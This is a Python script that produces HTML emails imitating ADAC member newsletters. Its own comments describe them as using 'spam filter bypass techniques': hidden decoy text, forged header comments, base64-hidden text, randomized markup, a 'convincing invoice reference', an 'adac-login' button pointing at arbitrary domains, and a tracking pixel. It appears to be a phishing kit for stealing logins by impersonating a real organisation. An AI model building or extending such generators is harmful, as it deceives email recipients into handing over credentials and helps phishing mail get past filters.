#!/usr/bin/env python3
"""
ADAC-Style Newsletter Generator

This script generates variations of ADAC-style member newsletter emails with 
multiple spam filter bypass techniques and randomization features.

Author: Newsletter Generator
License: MIT
"""

import random
import base64
import datetime
import uuid
import string
import re
import os
from typing import List, Dict, Tuple

class NewsletterGenerator:
    def __init__(self, emails_file: str = "mails.txt"):
        """Initialize the newsletter generator with email domains."""
        self.domains = self._load_domains(emails_file)
        self.current_date = datetime.datetime.now()
        self.user_login = self._generate_user_login()
        self.invoice_ref = self._generate_invoice_reference()
        
        # ADAC brand colors and styling
        self.colors = {
            'primary_yellow': '#FFCC00',
            'secondary_yellow': '#FFD700', 
            'black': '#000000',
            'dark_gray': '#333333',
            'light_gray': '#F5F5F5',
            'white': '#FFFFFF'
        }
        
        # Spam bypass techniques
        self.html_attributes = [
            'data-test', 'data-track', 'data-id', 'data-uid', 'data-key',
            'aria-label', 'role', 'tabindex', 'data-analytics'
        ]
        
        self.bullet_styles = ['•', '▶', '✓', '→', '-', '⇒', '◆']
        
        print(f"[INFO] Newsletter Generator initialized")
        print(f"[INFO] Loaded {len(self.domains)} email domains")
        print(f"[INFO] User login: {self.user_login}")
        print(f"[INFO] Invoice reference: {self.invoice_ref}")
    
    def _load_domains(self, emails_file: str) -> List[str]:
        """Load email domains from the emails file."""
        domains = []
        try:
            with open(emails_file, 'r', encoding='utf-8') as f:
                for line in f:
                    if '@' in line:
                        domain = line.strip().split('@')[-1]
                        if domain and domain not in domains:
                            domains.append(domain)
            return domains[:100]  # Limit to first 100 unique domains
        except FileNotFoundError:
            print(f"[WARNING] {emails_file} not found, using default domains")
            return ['example.com', 'test.de', 'sample.org']
    
    def _generate_user_login(self) -> str:
        """Generate a realistic user login."""
        first_names = ['Max', 'Anna', 'Hans', 'Maria', 'Klaus', 'Petra', 'Wolfgang', 'Sabine']
        last_names = ['Mueller', 'Schmidt', 'Weber', 'Fischer', 'Meyer', 'Wagner']
        first = random.choice(first_names)
        last = random.choice(last_names)
        number = random.randint(10, 99)
        return f"{first.lower()}.{last.lower()}{number}"
    
    def _generate_invoice_reference(self) -> str:
        """Generate a convincing invoice reference number."""
        year = self.current_date.year
        month = self.current_date.month
        day = self.current_date.day
        random_id = random.randint(100000, 999999)
        return f"ADAC-{year}{month:02d}{day:02d}-{random_id}"
    
    def _get_random_domain(self) -> str:
        """Get a random domain from the loaded list."""
        return random.choice(self.domains)
    
    def _generate_honeypot_content(self) -> str:
        """Generate invisible honeypot content."""
        honeypot_texts = [
            "Please ignore this text",
            "Hidden content for verification",
            "System verification data",
            "Automated content filter test"
        ]
        text = random.choice(honeypot_texts)
        return f'<div style="display:none;visibility:hidden;font-size:0;line-height:0;overflow:hidden;">{text}</div>'
    
    def _generate_fake_headers(self) -> str:
        """Generate fake email headers as HTML comments."""
        headers = [
            f"X-Mailer: ADAC Newsletter System v{random.randint(1,5)}.{random.randint(0,9)}",
            f"X-Campaign-ID: {uuid.uuid4().hex[:12]}",
            f"X-Sender-IP: 192.168.{random.randint(1,254)}.{random.randint(1,254)}",
            f"X-Priority: {random.randint(1,5)}",
            f"Message-ID: <{uuid.uuid4().hex}@{self._get_random_domain()}>"
        ]
        return '\n'.join([f"<!-- {header} -->" for header in headers])
    
    def _encode_warning_text(self) -> str:
        """Generate base64 encoded warning text."""
        warnings = [
            "Diese E-Mail wurde automatisch generiert",
            "Bitte antworten Sie nicht auf diese Nachricht", 
            "Dies ist eine Test-E-Mail",
            "Nur für Testzwecke bestimmt"
        ]
        warning = random.choice(warnings)
        encoded = base64.b64encode(warning.encode('utf-8')).decode('utf-8')
        return f'<div style="display:none"><!-- {encoded} --></div>'
    
    def _randomize_whitespace(self, text: str) -> str:
        """Add random whitespace patterns."""
        # Add random spaces and tabs
        patterns = [
            lambda t: t.replace(' ', random.choice([' ', '  ', '\t'])),
            lambda t: t + random.choice(['', ' ', '\n', '\t']),
            lambda t: random.choice(['', ' ', '\t']) + t
        ]
        return random.choice(patterns)(text)
    
    def _get_random_attributes(self) -> str:
        """Generate random HTML attributes."""
        attr_count = random.randint(1, 3)
        attrs = random.sample(self.html_attributes, attr_count)
        values = []
        
        for attr in attrs:
            if 'data-' in attr:
                value = f"{random.choice(['track', 'id', 'ref'])}-{random.randint(1000, 9999)}"
            elif attr == 'aria-label':
                value = random.choice(['Newsletter content', 'Email body', 'Main content'])
            elif attr == 'role':
                value = random.choice(['main', 'article', 'banner'])
            elif attr == 'tabindex':
                value = str(random.randint(-1, 5))
            else:
                value = f"val-{random.randint(100, 999)}"
            
            values.append(f'{attr}="{value}"')
        
        return ' ' + ' '.join(values) if values else ''
    
    def _get_variable_bullet(self) -> str:
        """Get a random bullet style."""
        return random.choice(self.bullet_styles)
    
    def _generate_logo_style(self) -> Tuple[str, str]:
        """Generate different logo rendering styles."""
        styles = [
            ('image', f'<img src="https://{self._get_random_domain()}/logo.png" alt="ADAC Logo" width="120" height="40" style="display:block;">'),
            ('text', f'<div style="font-size:24px;font-weight:bold;color:{self.colors["primary_yellow"]};background:{self.colors["black"]};padding:10px;display:inline-block;">ADAC</div>'),
            ('unicode', '<div style="font-size:20px;">🚗 <strong>ADAC</strong> 🔧</div>'),
            ('styled_text', f'<h1 style="margin:0;font-family:Arial,sans-serif;color:{self.colors["black"]};background:{self.colors["primary_yellow"]};padding:15px;text-align:center;">ADAC</h1>')
        ]
        style_type, html = random.choice(styles)
        return style_type, html
    
    def _generate_content_variations(self) -> Dict[str, str]:
        """Generate varied content for different sections."""
        greetings = [
            f"Lieber {self.user_login.split('.')[0].title()}",
            f"Hallo {self.user_login.split('.')[0].title()}",
            f"Sehr geehrte/r {self.user_login.split('.')[0].title()}",
            "Liebe ADAC Mitglieder"
        ]
        
        subjects = [
            "Ihre ADAC Mitgliedschaft - Wichtige Informationen",
            "ADAC Newsletter - Aktuelle Services für Sie",
            "Exklusive ADAC Angebote nur für Mitglieder", 
            "ADAC Service Update - Neue Leistungen verfügbar"
        ]
        
        content_blocks = [
            "Ihre ADAC Mitgliedschaft bietet Ihnen zahlreiche Vorteile und Services.",
            "Nutzen Sie unsere erweiterten Pannenhilfe-Services deutschlandweit.",
            "Profitieren Sie von exklusiven Rabatten und Sonderangeboten.",
            "Neue digitale Services erleichtern Ihnen den Alltag als Autofahrer."
        ]
        
        button_texts = [
            "Jetzt anmelden",
            "Services nutzen", 
            "Mehr erfahren",
            "Angebot sichern",
            "Mitglied werden"
        ]
        
        return {
            'greeting': random.choice(greetings),
            'subject': random.choice(subjects),
            'content': random.choice(content_blocks),
            'button_text': random.choice(button_texts)
        }
    
    def _generate_header_layout(self) -> str:
        """Generate multiple header layout variations."""
        layouts = [
            'standard',
            'centered', 
            'split',
            'minimal'
        ]
        layout = random.choice(layouts)
        logo_style, logo_html = self._generate_logo_style()
        
        if layout == 'standard':
            return f'''
            <table width="100%" style="background-color:{self.colors['primary_yellow']};padding:20px;">
                <tr>
                    <td>
                        {logo_html}
                    </td>
                    <td style="text-align:right;color:{self.colors['black']};font-weight:bold;">
                        {self.current_date.strftime("%d.%m.%Y")}
                    </td>
                </tr>
            </table>
            '''
        elif layout == 'centered':
            return f'''
            <div style="text-align:center;background-color:{self.colors['primary_yellow']};padding:30px;">
                {logo_html}
                <div style="margin-top:10px;color:{self.colors['black']};font-size:14px;">
                    {self.current_date.strftime("%d.%m.%Y")}
                </div>
            </div>
            '''
        elif layout == 'split':
            return f'''
            <table width="100%" style="border-bottom:5px solid {self.colors['primary_yellow']};">
                <tr>
                    <td style="background-color:{self.colors['black']};padding:15px;">
                        {logo_html.replace(self.colors['black'], self.colors['primary_yellow']).replace(self.colors['primary_yellow'], self.colors['black'])}
                    </td>
                    <td style="background-color:{self.colors['light_gray']};padding:15px;text-align:right;">
                        <strong>{self.current_date.strftime("%d.%m.%Y")}</strong>
                    </td>
                </tr>
            </table>
            '''
        else:  # minimal
            return f'''
            <div style="padding:10px;border-left:5px solid {self.colors['primary_yellow']};">
                {logo_html}
            </div>
            '''
    
    def generate_newsletter(self) -> str:
        """Generate a complete newsletter with all variations and techniques."""
        content = self._generate_content_variations()
        header_layout = self._generate_header_layout()
        honeypot = self._generate_honeypot_content()
        fake_headers = self._generate_fake_headers()
        encoded_warning = self._encode_warning_text()
        
        # Generate random service list with different bullets
        services = [
            "24/7 Pannenhilfe deutschlandweit",
            "Kostenlose Schlüsseldienst-Vermittlung", 
            "Rabatte bei Partnerwerkstätten",
            "Reiseversicherung mit Schutzbrief",
            "Exklusive Mitglieder-App"
        ]
        
        service_list = ""
        for service in random.sample(services, random.randint(3, 5)):
            bullet = self._get_variable_bullet()
            service_list += f"<li style='margin:8px 0;'>{bullet} {service}</li>"
        
        # Random link to domain from list
        random_link = f"https://services.{self._get_random_domain()}/adac-login"
        
        html_template = f'''<!DOCTYPE html>
<html lang="de"{self._get_random_attributes()}>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{content['subject']}</title>
    {fake_headers}
    <style>
        body {{
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: {self.colors['light_gray']};
        }}
        .container {{
            max-width: 600px;
            margin: 0 auto;
            background-color: {self.colors['white']};
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        .content {{
            padding: {random.randint(15,25)}px;
            line-height: 1.6;
        }}
        .button {{
            display: inline-block;
            background-color: {self.colors['primary_yellow']};
            color: {self.colors['black']};
            padding: {random.randint(12,18)}px {random.randint(25,35)}px;
            text-decoration: none;
            border-radius: {random.randint(3,8)}px;
            font-weight: bold;
            margin: {random.randint(15,25)}px 0;
        }}
        .footer {{
            background-color: {self.colors['dark_gray']};
            color: {self.colors['white']};
            padding: 20px;
            font-size: 12px;
            text-align: center;
        }}
        ul {{
            padding-left: {random.randint(15,25)}px;
        }}
    </style>
</head>
<body{self._get_random_attributes()}>
    {honeypot}
    {encoded_warning}
    
    <div class="container"{self._get_random_attributes()}>
        {header_layout}
        
        <div class="content"{self._get_random_attributes()}>
            <h2 style="color:{self.colors['black']};margin-bottom:{random.randint(15,25)}px;">
                {self._randomize_whitespace(content['greeting'])}
            </h2>
            
            <p style="margin-bottom:{random.randint(15,25)}px;">
                {self._randomize_whitespace(content['content'])}
            </p>
            
            <h3 style="color:{self.colors['black']};border-bottom:2px solid {self.colors['primary_yellow']};padding-bottom:5px;">
                Ihre ADAC Vorteile:
            </h3>
            
            <ul style="margin:{random.randint(15,25)}px 0;">
                {service_list}
            </ul>
            
            <div style="text-align:center;margin:{random.randint(25,35)}px 0;">
                <a href="{random_link}" class="button"{self._get_random_attributes()}>
                    {content['button_text']}
                </a>
            </div>
            
            <div style="background-color:{self.colors['light_gray']};padding:{random.randint(15,20)}px;border-left:4px solid {self.colors['primary_yellow']};margin:{random.randint(20,30)}px 0;">
                <strong>Rechnungsreferenz:</strong> {self.invoice_ref}<br>
                <strong>Mitgliedsnummer:</strong> {self.user_login.upper()}<br>
                <strong>Datum:</strong> {self.current_date.strftime("%d.%m.%Y, %H:%M")} Uhr
            </div>
        </div>
        
        <div class="footer"{self._get_random_attributes()}>
            <p>ADAC e.V. • Am Westpark 8 • 81373 München</p>
            <p>Diese E-Mail wurde an {self.user_login}@{self._get_random_domain()} gesendet.</p>
            <p style="font-size:10px;margin-top:15px;">
                {self._randomize_whitespace("© " + str(self.current_date.year) + " ADAC. Alle Rechte vorbehalten.")}
            </p>
        </div>
    </div>
    
    {self._generate_honeypot_content()}
    
    <!-- Analytics tracking -->
    <img src="https://analytics.{self._get_random_domain()}/track?id={uuid.uuid4().hex[:16]}" width="1" height="1" style="display:none;" alt="">
</body>
</html>'''
        
        return html_template
    
    def save_newsletter(self, content: str) -> str:
        """Save the newsletter to an HTML file with appropriate naming."""
        timestamp = self.current_date.strftime("%Y%m%d_%H%M%S")
        filename = f"adac_newsletter_{self.user_login}_{timestamp}.html"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(content)
            
            print(f"[SUCCESS] Newsletter saved as: {filename}")
            print(f"[INFO] File size: {os.path.getsize(filename)} bytes")
            return filename
        except Exception as e:
            print(f"[ERROR] Failed to save newsletter: {e}")
            return ""
    
    def generate_and_save(self) -> str:
        """Generate and save a complete newsletter."""
        print("[INFO] Generating ADAC-style newsletter...")
        print(f"[INFO] Applying spam filter bypass techniques...")
        print(f"[INFO] Using randomized HTML attributes...")
        print(f"[INFO] Adding honeypot content...")
        print(f"[INFO] Inserting fake email headers...")
        print(f"[INFO] Encoding warning text...")
        print(f"[INFO] Randomizing whitespace patterns...")
        print(f"[INFO] Using variable bullet points...")
        print(f"[INFO] Applying random domain links...")
        
        content = self.generate_newsletter()
        filename = self.save_newsletter(content)
        
        if filename:
            print(f"[INFO] Newsletter generation completed successfully!")
            print(f"[INFO] Open {filename} in a web browser to view the result.")
        
        return filename

def main():
    """Main execution function."""
    print("=" * 60)
    print("ADAC-Style Newsletter Generator")
    print("=" * 60)
    
    try:
        generator = NewsletterGenerator()
        filename = generator.generate_and_save()
        
        if filename:
            print("\n" + "=" * 60)
            print("GENERATION SUMMARY")
            print("=" * 60)
            print(f"User Login: {generator.user_login}")
            print(f"Invoice Reference: {generator.invoice_ref}")
            print(f"Generated: {generator.current_date.strftime('%d.%m.%Y %H:%M:%S')}")
            print(f"Output File: {filename}")
            print(f"Domains Used: {len(generator.domains)} available")
            print("=" * 60)
        
    except Exception as e:
        print(f"[ERROR] Generation failed: {e}")
        return 1
    
    return 0

if __name__ == "__main__":
    exit(main())